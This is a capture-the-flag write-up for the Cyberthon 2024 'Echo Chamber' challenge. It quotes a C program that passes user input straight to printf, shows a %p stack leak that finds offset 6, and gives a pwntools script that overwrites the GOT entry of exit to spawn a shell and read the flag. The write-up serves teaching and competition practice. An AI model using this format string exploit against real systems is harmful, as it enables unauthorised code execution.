# Echo Chamber

## Problem Statement

Okay, after getting pwned three times in a row i've decided enough is enough. I'm just going to let u list files on my
system. No shell for you!

Interact with the service at: `chals.t.cyberthon24.ctf.sg:33031`

Concept(s) Required:

- [Format String Bug (FSB)](https://www.youtube.com/watch?v=0WvrSfcdq1I)
- [GOT Overwrite with FSB write](https://www.youtube.com/watch?v=t1LH9D5cuK4)

Note: once you get a shell, the flag.txt can be found in the user's home directory.

## Solution

Inspecting the source file,

```c
void shell()
{
    system("/bin/sh");
}

void main()
{
    char input[256];

    ...

    fgets(input, 255, stdin);

    puts("ECHO:");
    printf(input);

    exit(0);
}
```

The use of `printf()` without specifying a format string leaves the program vulnerable to a format string bug. This bug
allows us to read from or write to arbitrary memory locations. Our goal is obviously to somehow call the `shell()` function.

We could override the address of the `exit` function in the last line with the address of `shell()`. This is known as GOT Overwrite.
But first, we need to find the offset before we begin to override the stack. We can just send a couple of `%p` and see where they appear in the stack.

```shell
Enter Input => %p %p %p %p %p %p %p %p
ECHO:
0x1 0x1 0x7ff6dbeac887 0x5 (nil) 0x7025207025207025 0x2520702520702520 0xa70252070252070
```
`0x7025207025207025` is the hex for `%p`, so we see that the offset is `6`.

Now using `pwntools`, it is fairly straightforward to do format string overwrite:

```python
from pwn import *

elf = context.binary = ELF("./echo_chamber", checksec=False)
payload = fmtstr_payload(6, { elf.got['exit']: elf.sym['shell'] })

r = remote("chals.t.cyberthon24.ctf.sg", 33031)
r.sendlineafter(b'=> ', payload)
r.sendline(b'cat ~/flag.txt')

r.interactive()
```
